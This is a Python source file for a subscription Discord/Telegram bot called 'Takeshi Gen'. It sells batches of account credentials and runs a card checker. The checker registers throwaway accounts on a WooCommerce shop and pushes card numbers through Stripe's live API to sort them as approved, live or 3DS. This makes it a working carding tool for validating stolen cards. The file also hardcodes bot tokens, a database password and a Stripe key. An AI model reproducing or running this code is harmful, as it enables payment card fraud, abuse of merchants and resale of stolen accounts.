import discord
from discord.ext import commands
import asyncio
import asyncpg
import random
import string
import datetime
import io
import logging
import requests
import re
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Hardcoded Configuration
DISCORD_TOKEN = "MTQ1NzYyMDgzNDg0MjcwNTk5Mw.GSxkZF.wKQW7Uu6uxglfz3zRFebCBW_PIkAM1_0S9HYfc"
TELEGRAM_TOKEN = "7220527825:AAHl9xaJ8jGV5Cebje_E1XiAoIMfR_WywQU"
LOG_BOT_TOKEN = "8500825785:AAE5JeNxxiJAwskwoKCTGyDbf40xeGf9Pg0"
DATABASE_URL = "postgresql://neondb_owner:npg_k9clhes7aVHN@ep-old-shape-a11o6qer-pooler.ap-southeast-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"
GENERATE_CHANNEL_ID = 1449662789235900426
ADMIN_ID_DISCORD = 1439975528143650968
ADMIN_ID_TELEGRAM = 8154195026

intents = discord.Intents.all()
discord_bot = commands.Bot(command_prefix='?', intents=intents)

pool = None
SITE_URL = "https://k33b.com"
ua_list = ['Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36']
cooldowns = {}

# --- Database Setup ---
async def setup_db():
    global pool
    try:
        pool = await asyncpg.create_pool(DATABASE_URL)
        async with pool.acquire() as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS services (
                    id SERIAL PRIMARY KEY,
                    name TEXT UNIQUE
                );
                CREATE TABLE IF NOT EXISTS stocks (
                    id SERIAL PRIMARY KEY,
                    service_id INTEGER REFERENCES services(id) ON DELETE CASCADE,
                    account_line TEXT
                );
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    subscription_expiry TIMESTAMP,
                    is_reseller BOOLEAN DEFAULT FALSE
                );
                CREATE TABLE IF NOT EXISTS keys (
                    key TEXT PRIMARY KEY,
                    duration_days INTEGER DEFAULT 0,
                    duration_hours INTEGER DEFAULT 0,
                    duration_months INTEGER DEFAULT 0,
                    is_lifetime BOOLEAN DEFAULT FALSE,
                    used BOOLEAN DEFAULT FALSE
                );
            ''')
            # Check if is_reseller exists, if not add it
            try:
                await conn.execute("ALTER TABLE users ADD COLUMN is_reseller BOOLEAN DEFAULT FALSE")
            except Exception:
                pass
        logger.info("Database setup completed.")
    except Exception as e:
        logger.error(f"Database setup error: {e}")

# --- Helper Functions ---
def generate_random_string(length=7):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def gen_creds():
    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{user}@gmail.com", f"Pass{random.randint(10000,99999)}!@#"

async def get_bin_info(bin_number):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number[:6]}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return f"{data.get('brand')} - {data.get('type')} - {data.get('level')} - {data.get('bank')} - {data.get('country_name')} {data.get('country_flag')}"
    except: pass
    return "Unknown"

def send_log_to_tg(message):
    try:
        url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": ADMIN_ID_TELEGRAM, "text": message, "parse_mode": "HTML"})
    except Exception as e:
        logger.error(f"Failed to send log to TG: {e}")

def check_card_logic(card_line, user_info="Unknown"):
    try:
        if '|' not in card_line: return "ERROR", "INVALID FORMAT"
        n, mm, yy, cvc = card_line.split('|')[:4]
        ua = random.choice(ua_list)
        email, password = gen_creds()
        session = requests.Session()
        
        cookies = {
            '__stripe_mid': '6cb7e117-0721-41ae-adce-1cd718365c508569d5',
            '__stripe_sid': '5577a1e0-c3be-4a86-ad05-f679b1bf589ee7b908',
            'cookieyes-consent': 'consentid:d09OYWdHMEF4WUNaMTBTcjdQc214NEVFcHBFU0xnZlg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-31%2004%3A53%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fk33b.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-12-31%2004%3A53%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fk33b.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fk33b.com%2Fmy-account%2Fadd-payment-method%2F',
        }

        headers = {
            'authority': 'k33b.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://k33b.com',
            'referer': 'https://k33b.com/my-account/add-payment-method/',
            'user-agent': ua,
        }
        
        r = session.get(f'{SITE_URL}/my-account/add-payment-method/', headers=headers, cookies=cookies, timeout=15)
        nonce = re.search(r'name="woocommerce-register-nonce" value="([a-f0-9]+)"', r.text)
        if not nonce: return "ERROR", "REG_FAIL (NONCE)"
        
        reg_data = {
            'username': email.split('@')[0],
            'email': email,
            'password': password,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://k33b.com/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2025-12-31 04:53:48',
            'wc_order_attribution_session_pages': '3',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': ua,
            'woocommerce-register-nonce': nonce.group(1),
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register'
        }
        
        session.post(f'{SITE_URL}/my-account/add-payment-method/', data=reg_data, headers=headers, cookies=cookies, timeout=15)
        r = session.get(f'{SITE_URL}/my-account/add-payment-method/', headers=headers, cookies=session.cookies, timeout=15)
        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', r.text)
        if not ajax_nonce: ajax_nonce = re.search(r'name="_ajax_nonce" value="([^"]+)"', r.text)
        if not ajax_nonce: return "ERROR", "AJAX_FAIL"
        
        stripe_key_match = re.search(r'pk_live_[a-zA-Z0-9]+', r.text)
        stripe_key = stripe_key_match.group(0) if stripe_key_match else "pk_live_51OfOfHKcHg1V8S6AL023w7Ow95iQ1Zys3YHzhSUoRvZOaA4p31bfjEuvyQ0eJpgnBoW1V77rWgh8bjyE60sIUbib00lAW3pk2Q"
        
        pm_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }
        pm_data = (
            f'type=card&card[number]={n.replace(" ", "+")}&card[cvc]={cvc}&card[exp_year]={yy[-2:]}&card[exp_month]={mm}'
            f'&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US'
            f'&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+payment-element%3B+deferred-intent'
            f'&referrer=https%3A%2F%2Fk33b.com&time_on_page=160856&client_attribution_metadata[client_session_id]=175ff1f9-68a4-494b-a422-60dd2f0a436f'
            f'&key={stripe_key}'
        )
        r = session.post('https://api.stripe.com/v1/payment_methods', headers=pm_headers, data=pm_data, timeout=15)
        res_json = r.json()
        if 'id' not in res_json:
            status = "DECLINE"
            res_text = res_json.get('error', {}).get('message', 'Unknown PM Error')
            if 'card is not supported' in res_text.lower(): status = "DECLINE"
        else:
            pm_id = res_json['id']
            auth_headers = {'authority': 'k33b.com', 'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://k33b.com', 'referer': 'https://k33b.com/my-account/add-payment-method/', 'user-agent': ua, 'x-requested-with': 'XMLHttpRequest'}
            auth_data = {'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce.group(1)}
            r = session.post('https://k33b.com/', params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, data=auth_data, headers=auth_headers, timeout=15)
            res_text = r.text
            
            res_text_lower = res_text.lower()
            if '"status":"succeeded"' in res_text_lower:
                status = "APPROVE"
            elif 'security code is incorrect' in res_text_lower or 'incorrect_cvc' in res_text_lower:
                status = "CCN LIVE"
            elif 'requires_action' in res_text_lower or '"status":"requires_action"' in res_text_lower:
                status = "3DS OTP"
            elif '"success":true' in res_text_lower:
                status = "APPROVE"
            else:
                status = "DECLINE"

        # Log to TG
        log_msg = f"User: {user_info}\nCard: {card_line}\nResult: {res_text}"
        emoji = {"APPROVE": "✅", "CCN LIVE": "🟡", "3DS OTP": "🔵", "DECLINE": "❌", "ERROR": "⚠️"}.get(status, "⚠️")
        send_log_to_tg(f"<b>{emoji} {status}</b>\n{log_msg}")
        return status, res_text
    except Exception as e:
        return "ERROR", str(e)

# --- Discord Commands ---
@discord_bot.command()
async def chk(ctx, card: str = None):
    if not card:
        await ctx.send("❌ Usage: `?chk <card>`")
        return
    async with pool.acquire() as conn:
        user = await conn.fetchrow("SELECT subscription_expiry FROM users WHERE user_id = $1", ctx.author.id)
        is_sub = (user and user['subscription_expiry'] > datetime.datetime.now()) or ctx.author.id == ADMIN_ID_DISCORD
    if not is_sub:
        now = datetime.datetime.now()
        if ctx.author.id in cooldowns and (now - cooldowns[ctx.author.id]).total_seconds() < 10:
            await ctx.send("⏳ Cooldown! Wait 10 seconds.")
            return
        cooldowns[ctx.author.id] = now
    
    msg = await ctx.send("🔍 Checking...")
    loop = asyncio.get_event_loop()
    res, res_full = await loop.run_in_executor(None, check_card_logic, card, f"Discord: {ctx.author.name} ({ctx.author.id})")
    
    bin_info = await get_bin_info(card.split('|')[0])
    title = "💳 Card Result"; color = discord.Color.blue()
    
    if res == "APPROVE":
        title = "✅ Approved"; color = discord.Color.green()
    elif res == "CCN LIVE":
        title = "🟡 CCN Live"; color = discord.Color.gold()
    elif res == "3DS OTP":
        title = "🔵 3DS OTP"; color = discord.Color.blue()
    elif res == "DECLINE":
        title = "❌ Declined"; color = discord.Color.red()
        
    embed = discord.Embed(title=title, color=color)
    embed.add_field(name="Card", value=f"`{card}`", inline=False)
    
    # Ensure raw response fits in embed
    if res == "3DS OTP":
        safe_res = "Requires Action (3DS OTP)"
    else:
        safe_res = str(res_full)
        if len(safe_res) > 1000:
            safe_res = safe_res[:1000] + "..."
    
    embed.add_field(name="Result", value=f"```json\n{safe_res}\n```", inline=False)
    
    embed.add_field(name="Bin Info", value=f"`{bin_info}`", inline=False)
    await msg.edit(content=None, embed=embed)

@discord_bot.command()
async def mchk(ctx):
    if not ctx.message.reference:
        await ctx.send("❌ Please reply to a `.txt` file with `?mchk`.")
        return
    async with pool.acquire() as conn:
        user = await conn.fetchrow("SELECT subscription_expiry FROM users WHERE user_id = $1", ctx.author.id)
        is_sub = (user and user['subscription_expiry'] > datetime.datetime.now()) or ctx.author.id == ADMIN_ID_DISCORD
    if not is_sub:
        await ctx.send("❌ Mass check is for subscribers only!"); return
    
    ref_msg = await ctx.channel.fetch_message(ctx.message.reference.message_id)
    if not ref_msg.attachments:
        await ctx.send("❌ No file attached."); return
    
    file = ref_msg.attachments[0]
    content = await file.read()
    cards = content.decode().splitlines()[:1000]
    total = len(cards)
    
    # Progress Embed
    embed = discord.Embed(title="🚀 Mass Checking...", color=0x5865f2)
    embed.add_field(name="APPROVE", value="`0`", inline=True)
    embed.add_field(name="CCN LIVE", value="`0`", inline=True)
    embed.add_field(name="3DS OTP", value="`0`", inline=True)
    embed.add_field(name="DECLINE", value="`0`", inline=True)
    embed.add_field(name="Total processing", value=f"`{total}`", inline=False)
    embed.set_footer(text=f"Requested by: {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
    
    status_msg = await ctx.send(embed=embed)
    
    counts = {"APPROVE": 0, "CCN LIVE": 0, "3DS OTP": 0, "DECLINE": 0, "ERROR": 0}
    approved_list = []; ccn_list = []; otp_list = []; declined_list = []; error_list = []
    
    loop = asyncio.get_event_loop()
    last_update = datetime.datetime.now()
    
    for i, card in enumerate(cards):
        card = card.strip()
        if not card: continue
        
        # Unpack the two values returned by check_card_logic
        res, res_full = await loop.run_in_executor(None, check_card_logic, card, f"Discord Mass: {ctx.author.name}")
        
        if res == "APPROVE":
            counts["APPROVE"] += 1; approved_list.append(card)
            # Send immediately with raw response
            log_entry = f"✅ **APPROVED**\nCard: `{card}`\nResult: `{res_full}`"
            # Ensure raw response isn't too long for Discord message
            if len(log_entry) > 1900:
                log_entry = log_entry[:1900] + "... (truncated)"
            file = discord.File(io.BytesIO(res_full.encode()), filename="approved_hit_raw.txt")
            await ctx.author.send(log_entry, file=file)
        elif res == "CCN LIVE":
            counts["CCN LIVE"] += 1; ccn_list.append(card)
            # Send immediately with raw response
            log_entry = f"🟡 **CCN LIVE**\nCard: `{card}`\nResult: `{res_full}`"
            if len(log_entry) > 1900:
                log_entry = log_entry[:1900] + "... (truncated)"
            file = discord.File(io.BytesIO(res_full.encode()), filename="ccn_live_hit_raw.txt")
            await ctx.author.send(log_entry, file=file)
        elif res == "3DS OTP":
            counts["3DS OTP"] += 1; otp_list.append(card)
            # Send immediately but simplified for 3DS wall
            log_entry = f"🔵 **3DS OTP**\nCard: `{card}`\nResult: `Requires Action (3DS OTP)`"
            await ctx.author.send(log_entry)
        elif res == "DECLINE":
            counts["DECLINE"] += 1; declined_list.append(card)
        else:
            counts["ERROR"] += 1; error_list.append(f"{card} -> {res}")
            
        # Update embed with accurate counters
        if (i + 1) % 2 == 0 or (i + 1) == total or (datetime.datetime.now() - last_update).total_seconds() > 1.5:
            new_embed = discord.Embed(title="🚀 Takeshi Gen • Mass Checking", color=0x5865f2)
            new_embed.add_field(name="✅ APPROVE", value=f"`{counts['APPROVE']}`", inline=True)
            new_embed.add_field(name="🟡 CCN LIVE", value=f"`{counts['CCN LIVE']}`", inline=True)
            new_embed.add_field(name="🔵 3DS OTP", value=f"`{counts['3DS OTP']}`", inline=True)
            new_embed.add_field(name="❌ DECLINE", value=f"`{counts['DECLINE']}`", inline=True)
            new_embed.add_field(name="📊 Progress", value=f"`{i+1} / {total}`", inline=False)
            new_embed.set_footer(text=f"Requested by: {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
            try:
                await status_msg.edit(embed=new_embed)
            except:
                pass
            last_update = datetime.datetime.now()

    # Final Summary
    final_embed = discord.Embed(title="✅ Check Finished!", color=discord.Color.green())
    final_embed.add_field(name="APPROVE", value=f"`{counts['APPROVE']}`", inline=True)
    final_embed.add_field(name="CCN LIVE", value=f"`{counts['CCN LIVE']}`", inline=True)
    final_embed.add_field(name="3DS OTP", value=f"`{counts['3DS OTP']}`", inline=True)
    final_embed.add_field(name="DECLINE", value=f"`{counts['DECLINE']}`", inline=True)
    final_embed.set_footer(text=f"Requested by: {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
    
    files = []
    if approved_list: files.append(discord.File(io.BytesIO("\n".join(approved_list).encode()), filename="approved_total.txt"))
    if ccn_list: files.append(discord.File(io.BytesIO("\n".join(ccn_list).encode()), filename="ccn_live_total.txt"))
    
    await status_msg.edit(embed=final_embed, attachments=files)


# --- Telegram Bot ---
tg_app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

async def tg_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID_TELEGRAM: 
        logger.info(f"Unauthorized TG access from {update.effective_user.id}")
        return
    keyboard = [
        [InlineKeyboardButton("🆕 Add Service", callback_data='add_service'), InlineKeyboardButton("📦 Add Stock", callback_data='add_stock')],
        [InlineKeyboardButton("♻️ Reset Stock", callback_data='reset_stock'), InlineKeyboardButton("🔔 Test Notification", callback_data='test_notification')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🛠️ Admin Panel", reply_markup=reply_markup)

async def tg_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if update.effective_user.id != ADMIN_ID_TELEGRAM: return
    await query.answer()
    if query.data == 'add_service':
        await query.edit_message_text("✍️ Please type the name of the new service:")
        context.user_data['action'] = 'adding_service'
    elif query.data == 'add_stock':
        async with pool.acquire() as conn:
            services = await conn.fetch("SELECT id, name FROM services")
        if not services:
            await query.edit_message_text("⚠️ No services created yet.")
            return
        keyboard = [[InlineKeyboardButton(s['name'], callback_data=f"stock_{s['id']}")] for s in services]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🎯 Select a service to add stock to:", reply_markup=reply_markup)
    elif query.data == 'reset_stock':
        async with pool.acquire() as conn:
            services = await conn.fetch("SELECT id, name FROM services")
        if not services:
            await query.edit_message_text("⚠️ No services available.")
            return
        keyboard = [[InlineKeyboardButton(s['name'], callback_data=f"reset_{s['id']}")] for s in services]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("♻️ Select a service to reset stock:", reply_markup=reply_markup)
    elif query.data == 'test_notification':
        send_log_to_tg("🔔 <b>Test Notification</b>\nThis is a test message from the Admin Panel.")
        await query.edit_message_text("✅ Test notification sent to the log bot.")
    elif query.data.startswith('stock_'):
        service_id = int(query.data.split('_')[1])
        context.user_data['action'] = 'adding_stock'
        context.user_data['service_id'] = service_id
        await query.edit_message_text("📂 Please upload the `.txt` file.")
    elif query.data.startswith('reset_'):
        service_id = int(query.data.split('_')[1])
        async with pool.acquire() as conn:
            await conn.execute("DELETE FROM stocks WHERE service_id = $1", service_id)
            service_name = await conn.fetchval("SELECT name FROM services WHERE id = $1", service_id)
        await query.edit_message_text(f"✅ Stock for **{service_name}** has been reset.")

async def tg_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID_TELEGRAM: return
    action = context.user_data.get('action')
    if action == 'adding_service':
        async with pool.acquire() as conn:
            await conn.execute("INSERT INTO services (name) VALUES ($1) ON CONFLICT DO NOTHING", update.message.text)
        await update.message.reply_text(f"✅ Service `{update.message.text}` created.")
        context.user_data['action'] = None
    elif action == 'adding_stock' and update.message.document:
        service_id = context.user_data.get('service_id')
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        lines = content.decode().splitlines()
        async with pool.acquire() as conn:
            await conn.executemany("INSERT INTO stocks (service_id, account_line) VALUES ($1, $2)", [(service_id, l) for l in lines if l.strip()])
            service_name = await conn.fetchval("SELECT name FROM services WHERE id = $1", service_id)
            total_stock = await conn.fetchval("SELECT count(*) FROM stocks WHERE service_id = $1", service_id)
        
        await update.message.reply_text(f"✅ Added `{len(lines)}` lines to **{service_name}**. Total: `{total_stock}`")
        context.user_data['action'] = None

tg_app.add_handler(CommandHandler("start", tg_start))
tg_app.add_handler(CommandHandler("reset", tg_start))
tg_app.add_handler(CallbackQueryHandler(tg_callback))
tg_app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, tg_message))

# --- Discord Commands ---
@discord_bot.command()
async def reset(ctx):
    if ctx.author.id != ADMIN_ID_DISCORD: return
    async with pool.acquire() as conn:
        services = await conn.fetch("SELECT id, name FROM services")
    if not services:
        await ctx.send("⚠️ No services available.")
        return
    view = discord.ui.View()
    for s in services:
        btn = discord.ui.Button(label=s['name'], style=discord.ButtonStyle.danger)
        async def make_callback(sid, sname):
            async def btn_cb(interaction):
                if interaction.user.id != ADMIN_ID_DISCORD: return
                await interaction.response.defer()
                async with pool.acquire() as conn:
                    await conn.execute("DELETE FROM stocks WHERE service_id = $1", sid)
                await interaction.followup.send(f"✅ Stock for **{sname}** has been reset.", ephemeral=True)
            return btn_cb
        btn.callback = await make_callback(s['id'], s['name'])
        view.add_item(btn)
    await ctx.send("♻️ Select a service to reset stock:", view=view)

# status, start, generate, add, key, redeem commands...
@discord_bot.command()
async def status(ctx):
    if not pool: return
    async with pool.acquire() as conn:
        services = await conn.fetch("SELECT id, name, (SELECT count(*) FROM stocks WHERE service_id = services.id) as count FROM services")
        user = await conn.fetchrow("SELECT is_reseller, subscription_expiry FROM users WHERE user_id = $1", ctx.author.id)
        
        status_text = ""
        for s in services:
            emoji = "🟢" if s['count'] > 50 else "🟡" if s['count'] > 0 else "🔴"
            status_text += f"{emoji} **{s['name']}** — `{s['count']}` units\n"
        
        sub_text = "❌ `Inactive`"
        role_text = "👤 `User`"
        
        if ctx.author.id == ADMIN_ID_DISCORD:
            role_text = "⚡ `Administrator`"
            sub_text = "♾️ `Lifetime Access`"
        elif user:
            if user['is_reseller']:
                role_text = "👑 `Reseller`"
            if user['subscription_expiry'] > datetime.datetime.now():
                sub_text = f"✅ `Active` until {user['subscription_expiry'].strftime('%Y-%m-%d')}"

        embed = discord.Embed(
            title="📊 Takeshi Gen • System Status",
            description="Current stock levels and account information.",
            color=0x2b2d31
        )
        embed.set_thumbnail(url=ctx.author.display_avatar.url)
        embed.add_field(name="📦 Inventory", value=status_text or "No services available.", inline=False)
        embed.add_field(name="🛡️ Identity", value=role_text, inline=True)
        embed.add_field(name="⏳ Subscription", value=sub_text, inline=True)
        embed.set_footer(text="Takeshi Gen V2 • Premium Generation Service", icon_url=discord_bot.user.display_avatar.url)
        await ctx.send(embed=embed)

@discord_bot.command()
async def start(ctx):
    embed = discord.Embed(
        title="✨ Takeshi Gen",
        description=(
            "Welcome to the most advanced generation service.\n\n"
            "**Available Commands:**\n"
            "🌀 `?generate` — Access your account stock\n"
            "💳 `?chk <card>` — High-speed card checker\n"
            "📂 `?mchk` — Mass check via .txt file\n"
            "📊 `?status` — View stock & subscription\n"
            "🔑 `?redeem` — Activate your license key"
        ),
        color=0x5865f2
    )
    embed.set_image(url="https://i.imgur.com/8N8v6m8.png") # High quality banner placeholder
    embed.set_footer(text="Click below to get started", icon_url=discord_bot.user.display_avatar.url)
    
    view = discord.ui.View()
    gen_btn = discord.ui.Button(label="Generate", style=discord.ButtonStyle.primary, custom_id="nav_gen")
    chk_btn = discord.ui.Button(label="Checker", style=discord.ButtonStyle.secondary, custom_id="nav_chk")
    
    async def nav_callback(interaction):
        if interaction.custom_id == "nav_gen":
            await generate(ctx)
        else:
            await ctx.send("To use the checker, type: `?chk 4111222233334444|01|25|000`")
        await interaction.response.defer()

    gen_btn.callback = nav_callback
    chk_btn.callback = nav_callback
    view.add_item(gen_btn)
    view.add_item(chk_btn)
    
    await ctx.send(embed=embed, view=view)

class GenerateButton(discord.ui.Button):
    def __init__(self, service):
        super().__init__(label=service['name'], style=discord.ButtonStyle.primary, emoji="🚀")
        self.service_name = service['name']; self.service_id = service['id']
    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        async with pool.acquire() as conn:
            user = await conn.fetchrow("SELECT subscription_expiry FROM users WHERE user_id = $1", interaction.user.id)
            if interaction.user.id != ADMIN_ID_DISCORD and (not user or user['subscription_expiry'] < datetime.datetime.now()):
                embed = discord.Embed(title="❌ Access Denied", description="You need an active subscription to generate accounts.", color=discord.Color.red())
                await interaction.followup.send(embed=embed, ephemeral=True); return
            
            rows = await conn.fetch("SELECT id, account_line FROM stocks WHERE service_id = $1 LIMIT 100", self.service_id)
            if len(rows) < 100:
                embed = discord.Embed(title="⚠️ Low Stock", description=f"Not enough stock for **{self.service_name}**. Please notify an admin.", color=discord.Color.orange())
                await interaction.followup.send(embed=embed, ephemeral=True); return
            
            ids = [r['id'] for r in rows]; lines = [r['account_line'] for r in rows]
            await conn.execute("DELETE FROM stocks WHERE id = ANY($1)", ids)
            
            file = discord.File(io.BytesIO("\n".join(lines).encode()), filename=f"{self.service_name}.txt")
            embed = discord.Embed(
                title="✅ Generation Successful",
                description=f"Successfully generated `100` lines for **{self.service_name}**.",
                color=discord.Color.green()
            )
            embed.set_footer(text="The file has been sent below")
            await interaction.followup.send(embed=embed, file=file, ephemeral=True)

class GenerateView(discord.ui.View):
    def __init__(self, services):
        super().__init__(timeout=180)
        for s in services: self.add_item(GenerateButton(s))

@discord_bot.command()
async def generate(ctx):
    async with pool.acquire() as conn:
        services = await conn.fetch("SELECT id, name FROM services")
        await ctx.send(embed=discord.Embed(title="🎯 Generation", description="Select service:", color=discord.Color.purple()), view=GenerateView(services))

@discord_bot.command()
async def add(ctx):
    if ctx.author.id != ADMIN_ID_DISCORD: return
    view = discord.ui.View()
    s_btn = discord.ui.Button(label="Add Service", style=discord.ButtonStyle.success); st_btn = discord.ui.Button(label="Add Stock", style=discord.ButtonStyle.primary)
    async def s_cb(interaction):
        await interaction.response.send_message("Name:", ephemeral=True)
        msg = await discord_bot.wait_for('message', check=lambda m: m.author == interaction.user, timeout=30)
        async with pool.acquire() as conn: await conn.execute("INSERT INTO services (name) VALUES ($1) ON CONFLICT DO NOTHING", msg.content)
        await ctx.send(f"✅ Created `{msg.content}`.")
    async def st_cb(interaction):
        async with pool.acquire() as conn: services = await conn.fetch("SELECT id, name FROM services")
        s_view = discord.ui.View()
        for s in services:
            btn = discord.ui.Button(label=s['name'])
            async def b_cb(inter, sid=s['id'], sname=s['name']):
                await inter.response.send_message(f"Upload .txt for {sname}", ephemeral=True)
                f_msg = await discord_bot.wait_for('message', check=lambda m: m.author == inter.user and m.attachments, timeout=60)
                l = (await f_msg.attachments[0].read()).decode().splitlines()
                async with pool.acquire() as conn: await conn.executemany("INSERT INTO stocks (service_id, account_line) VALUES ($1, $2)", [(sid, x) for x in l if x.strip()])
                await ctx.send(f"✅ Added {len(l)} lines.")
            btn.callback = b_cb; s_view.add_item(btn)
        await interaction.response.send_message("Select service:", view=s_view, ephemeral=True)
    s_btn.callback = s_cb; st_btn.callback = st_cb; view.add_item(s_btn); view.add_item(st_btn); await ctx.send(view=view)

@discord_bot.command()
async def promote(ctx, user: discord.Member = None, duration_days: int = None):
    if ctx.author.id != ADMIN_ID_DISCORD: return
    if user is None or duration_days is None:
        await ctx.send("❌ Usage: `?promote <@user/id> <days>`")
        return
    exp = datetime.datetime.now() + datetime.timedelta(days=duration_days)
    async with pool.acquire() as conn:
        await conn.execute("""
            INSERT INTO users (user_id, subscription_expiry, is_reseller) 
            VALUES ($1, $2, TRUE) 
            ON CONFLICT (user_id) 
            DO UPDATE SET subscription_expiry = EXCLUDED.subscription_expiry, is_reseller = TRUE
        """, user.id, exp)
    await ctx.send(f"✅ User {user.mention} promoted to Reseller until `{exp.strftime('%Y-%m-%d %H:%M:%S')}`")

@discord_bot.command()
async def key(ctx, duration: int = None, unit: str = None):
    async with pool.acquire() as conn:
        u = await conn.fetchrow("SELECT is_reseller, subscription_expiry FROM users WHERE user_id = $1", ctx.author.id)
        is_admin = ctx.author.id == ADMIN_ID_DISCORD
        is_reseller = u and u['is_reseller'] and u['subscription_expiry'] > datetime.datetime.now()
        
        if not (is_admin or is_reseller):
            await ctx.send("❌ Access denied."); return
            
    if duration is None or unit is None:
        await ctx.send("❌ Usage: `?key <duration> <unit>` (e.g., `?key 7 days`)")
        return

    d=0; h=0; m=0; l=False; ds=f"{duration}{unit[0]}"
    if "day" in unit.lower(): d=duration
    elif "hour" in unit.lower(): h=duration
    elif "month" in unit.lower(): m=duration
    elif "lifetime" in unit.lower() and is_admin: l=True; ds="lifetime"
    else:
        if "lifetime" in unit.lower() and not is_admin:
            await ctx.send("❌ Resellers cannot create lifetime keys.")
        else:
            await ctx.send("❌ Invalid unit. Use: days, hours, months")
        return
    
    kv = f"takeshi_{ds}{generate_random_string(7)}"
    async with pool.acquire() as conn: 
        await conn.execute("INSERT INTO keys (key, duration_days, duration_hours, duration_months, is_lifetime) VALUES ($1, $2, $3, $4, $5)", kv, d, h, m, l)
    await ctx.send(f"🔑 Key: `{kv}`")

@discord_bot.command()
async def redeem(ctx, kv: str):
    async with pool.acquire() as conn:
        kd = await conn.fetchrow("SELECT * FROM keys WHERE key = $1 AND used = FALSE", kv)
        if not kd: await ctx.send("❌ Invalid."); return
